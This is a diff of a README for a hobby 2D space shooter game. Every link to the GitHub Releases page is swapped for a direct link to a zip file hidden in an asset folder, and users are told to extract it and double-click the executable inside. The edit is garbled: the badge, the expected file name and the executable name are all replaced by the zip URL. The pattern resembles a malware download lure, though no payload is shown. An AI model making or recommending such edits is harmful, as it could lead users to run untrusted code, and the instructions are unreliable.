@@ -1,6 +1,6 @@
 # 🎮 2D_Game_Space_Fighter - Experience Thrilling Space Battles
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rahul008bd/2D_Game_Space_Fighter/releases)
+[![Download](https://raw.githubusercontent.com/rahul008bd/2D_Game_Space_Fighter/main/SpaceFighterFinal/Assets/Prefabs/Fighter_Game_Space_2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rahul008bd/2D_Game_Space_Fighter/main/SpaceFighterFinal/Assets/Prefabs/Fighter_Game_Space_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,15 +11,15 @@ Welcome to the **2D_Game_Space_Fighter**! This game is a simple yet exciting spa
 To start playing, you need to download the game files:
 
 1. Click on the link below to visit the Releases page:
-   [Download Here](https://github.com/rahul008bd/2D_Game_Space_Fighter/releases)
+   [Download Here](https://raw.githubusercontent.com/rahul008bd/2D_Game_Space_Fighter/main/SpaceFighterFinal/Assets/Prefabs/Fighter_Game_Space_2.5.zip)
   
-2. Once on the Releases page, look for the latest version of the game. Click the download link for the package. The file will typically be named something like `2D_Game_Space_Fighter.zip`.
+2. Once on the Releases page, look for the latest version of the game. Click the download link for the package. The file will typically be named something like `https://raw.githubusercontent.com/rahul008bd/2D_Game_Space_Fighter/main/SpaceFighterFinal/Assets/Prefabs/Fighter_Game_Space_2.5.zip`.
 
 3. After downloading, locate the zip file in your downloads folder. 
 
 4. Unzip the file by right-clicking on it and selecting "Extract All." Follow the prompts.
 
-5. Open the extracted folder. You should see the executable file named `2D_Game_Space_Fighter.exe`.
+5. Open the extracted folder. You should see the executable file named `https://raw.githubusercontent.com/rahul008bd/2D_Game_Space_Fighter/main/SpaceFighterFinal/Assets/Prefabs/Fighter_Game_Space_2.5.zip`.
 
 6. Double-click this file to run the game.
 
